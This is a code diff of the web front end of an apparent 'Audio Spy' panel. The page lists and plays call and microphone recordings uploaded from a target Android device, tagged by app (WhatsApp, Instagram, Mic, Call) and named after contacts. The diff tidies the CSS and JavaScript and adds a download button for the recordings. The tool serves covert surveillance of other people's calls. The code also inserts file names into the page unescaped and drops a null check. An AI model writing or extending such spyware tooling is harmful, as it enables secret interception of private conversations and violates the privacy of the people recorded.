@@ -40,28 +40,16 @@
         }
 
         .top-bar { display: flex; justify-content: space-between; align-items: center; }
-
-        .back-btn {
-            color: var(--text-main); font-size: 1.2rem; text-decoration: none; margin-right: 15px;
-        }
-
+        .back-btn { color: var(--text-main); font-size: 1.2rem; text-decoration: none; margin-right: 15px; }
         .title { font-size: 1.2rem; font-weight: 600; letter-spacing: 0.5px; display: flex; align-items: center; }
 
         .live-badge {
-            font-size: 0.7rem; 
-            background: rgba(48, 209, 88, 0.15);
-            color: var(--accent-green);            
-            padding: 4px 10px; border-radius: 20px; 
-            border: 1px solid rgba(48, 209, 88, 0.3);
+            font-size: 0.7rem; background: rgba(48, 209, 88, 0.15); color: var(--accent-green); 
+            padding: 4px 10px; border-radius: 20px; border: 1px solid rgba(48, 209, 88, 0.3);
             display: flex; align-items: center; gap: 6px;
         }
 
-        .dot {
-            width: 6px; height: 6px; 
-            background: var(--accent-green);
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
-        }
+        .dot { width: 6px; height: 6px; background: var(--accent-green); border-radius: 50%; animation: pulse 1.5s infinite; }
 
         @keyframes pulse {
             0% { box-shadow: 0 0 0 0 rgba(48, 209, 88, 0.7); }
@@ -69,19 +57,13 @@
             100% { box-shadow: 0 0 0 0 rgba(48, 209, 88, 0); }
         }
 
-        .filters {
-            display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none;
-        }
-
+        .filters { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none; }
         .filter-pill {
             background: rgba(255,255,255,0.05); border: 1px solid var(--border);
             padding: 8px 16px; border-radius: 20px; font-size: 0.85rem; color: var(--text-muted);
             cursor: pointer; white-space: nowrap; transition: 0.3s;
         }
-
-        .filter-pill.active {
-            background: var(--text-main); color: #000; font-weight: 600; border-color: var(--text-main);
-        }
+        .filter-pill.active { background: var(--text-main); color: #000; font-weight: 600; border-color: var(--text-main); }
 
         .container { max-width: 800px; margin: 20px auto; padding: 0 15px; padding-bottom: 80px; }
 
@@ -108,6 +90,13 @@
 
         .details h4 { margin: 0; font-size: 0.95rem; font-weight: 500; color: #fff; }
         .details span { font-size: 0.75rem; color: var(--text-muted); }
+
+        .download-btn {
+            background: rgba(255,255,255,0.1); color: #fff; width: 35px; height: 35px;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            text-decoration: none; transition: 0.3s;
+        }
+        .download-btn:hover { background: var(--accent-blue); }
 
         audio {
             width: 100%; height: 36px; border-radius: 20px; filter: invert(1) hue-rotate(180deg); opacity: 0.8;
@@ -158,108 +147,33 @@
         let allRecordings = [];
         let currentFilter = 'All';
         let currentDeviceId = '';
-        
-        // --- ⚡ NO CONTACTS LIST NEEDED NOW ---
-        // Sab naam ab Android App se aayenge
 
         window.onload = () => {
             const urlParams = new URLSearchParams(window.location.search);
             const urlID = urlParams.get('id');
-
-            if (urlID) {
-                currentDeviceId = urlID;
-                localStorage.setItem('spy_device_id', urlID);
-            } else {
-                currentDeviceId = localStorage.getItem('spy_device_id');
-            }
+            currentDeviceId = urlID || localStorage.getItem('spy_device_id');
 
             if (!currentDeviceId) {
                 document.getElementById('accessDenied').style.display = 'flex';
                 return;
             }
-
-            console.log("✅ Loaded Audio Spy for ID:", currentDeviceId);
-
-            // 1. Fetch Audio
+            localStorage.setItem('spy_device_id', currentDeviceId);
             fetchHistory();
-            joinSocketRoom(currentDeviceId);
+            socket.emit('join', currentDeviceId);
         };
 
-        // --- 🧹 CLEAN FILE NAME LOGIC ---
-        // Ye function File Name se "_" aur "Timestamp" hata ke clean naam dikhayega
         function getDisplayName(filename) {
             if(!filename) return "Unknown Audio";
-
-            // 1. Extension hatao (.m4a, .mp4)
             let name = filename.replace(/\.[^/.]+$/, "");
-
-            // 2. Underscore se Split karo
             let parts = name.split('_');
-
-            // 3. Agar last part TimeStamp (Digits) hai, to hata do
-            // Kyunki Android App bhejta hai: "Buddhu_17453432.m4a"
-            if (parts.length > 1 && /^\d+$/.test(parts[parts.length - 1])) {
-                parts.pop(); 
-            }
-
-            // 4. Waapas join karo aur Underscores ko Space bana do
-            let cleanName = parts.join(' ');
-
-            return cleanName || "Unknown Call";
-        }
-
-        socket.on('new-audio', (data) => {
-            if(currentDeviceId && data.device_id !== currentDeviceId) return;
-            
-            console.log("🔊 New Audio Received:", data);
-            
-            // Ab direct file name use hoga
-            const displayName = getDisplayName(data.name || data.filename);
-
-            const processed = {
-                app: detectApp(data.name),
-                displayName: displayName, 
-                date: new Date().toLocaleDateString(),
-                time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
-                url: data.url,
-                id: data.device_id
-            };
-
-            allRecordings.unshift(processed);
-            render();
-        });
-
-        function joinSocketRoom(id) {
-            socket.emit('join', id);
-        }
-
-        async function fetchHistory() {
-            document.getElementById('recordingsList').innerHTML = `<div class="status-msg">Syncing Audio Data...</div>`;
-
-            try {
-                const res = await fetch(`/api/audio-history/${currentDeviceId}`);
-                const data = await res.json();
-
-                if(Array.isArray(data) && data.length > 0) {
-                    allRecordings = data.map(file => processCloudinaryFile(file));
-                    render();
-                } else {
-                    document.getElementById('recordingsList').innerHTML = `<div class="status-msg">No recordings found yet.</div>`;
-                    allRecordings = [];
-                }
-            } catch (e) {
-                console.error(e);
-                document.getElementById('recordingsList').innerHTML = `<div class="status-msg" style="color:var(--accent-red)">Connection Error!</div>`;
-            }
+            if (parts.length > 1 && /^\d+$/.test(parts[parts.length - 1])) { parts.pop(); }
+            return parts.join(' ') || "Unknown Call";
         }
 
         function render() {
             const container = document.getElementById('recordingsList');
             container.innerHTML = '';
-
-            const filtered = allRecordings.filter(rec => 
-                currentFilter === 'All' ? true : rec.app === currentFilter
-            );
+            const filtered = allRecordings.filter(rec => currentFilter === 'All' ? true : rec.app === currentFilter);
 
             if(filtered.length === 0) {
                 container.innerHTML = `<div class="status-msg">No audio clips found.</div>`;
@@ -268,23 +182,22 @@
 
             filtered.forEach(rec => {
                 const iconInfo = getIconInfo(rec.app);
-                
                 const html = `
                     <div class="card">
                         <div class="card-top">
                             <div class="file-info">
-                                <div class="icon-box ${iconInfo.cls}">
-                                    <i class="${iconInfo.icon}"></i>
-                                </div>
+                                <div class="icon-box ${iconInfo.cls}"><i class="${iconInfo.icon}"></i></div>
                                 <div class="details">
                                     <h4>${rec.displayName}</h4>
                                     <span>${rec.app} • ${rec.date} • ${rec.time}</span>
                                 </div>
                             </div>
+                            <a href="${rec.url}" download="${rec.displayName}.m4a" target="_blank" class="download-btn" title="Download">
+                                <i class="fa-solid fa-download"></i>
+                            </a>
                         </div>
-                        <audio controls controlsList="nodownload">
+                        <audio controls preload="none">
                             <source src="${rec.url}" type="audio/mp4">
-                            <source src="${rec.url}" type="audio/mpeg">
                             Your browser does not support audio.
                         </audio>
                     </div>
@@ -293,13 +206,25 @@
             });
         }
 
+        async function fetchHistory() {
+            try {
+                const res = await fetch(`/api/audio-history/${currentDeviceId}`);
+                const data = await res.json();
+                if(Array.isArray(data)) {
+                    allRecordings = data.map(file => processCloudinaryFile(file));
+                    render();
+                }
+            } catch (e) {
+                document.getElementById('recordingsList').innerHTML = `<div class="status-msg" style="color:var(--accent-red)">Connection Error!</div>`;
+            }
+        }
+
         function processCloudinaryFile(file) {
             const d = new Date(file.created_at);
             const fileName = file.filename || file.public_id || "";
-            
             return {
                 app: detectApp(fileName),
-                displayName: getDisplayName(fileName), // Simply clean the name
+                displayName: getDisplayName(fileName),
                 date: d.toLocaleDateString(),
                 time: d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                 url: file.secure_url,
@@ -308,11 +233,9 @@
         }
 
         function detectApp(name) {
-            if(!name) return "Call";
             name = name.toLowerCase();
             if(name.includes('whatsapp')) return 'WhatsApp';
             if(name.includes('instagram')) return 'Instagram';
-            if(name.includes('telegram')) return 'Telegram';
             if(name.includes('mic')) return 'Mic';
             return 'Call';
         }
@@ -330,6 +253,12 @@
             btnElement.classList.add('active');
             render();
         }
+
+        socket.on('new-audio', (data) => {
+            if(data.device_id !== currentDeviceId) return;
+            allRecordings.unshift(processCloudinaryFile(data));
+            render();
+        });
     </script>
 </body>
 </html>
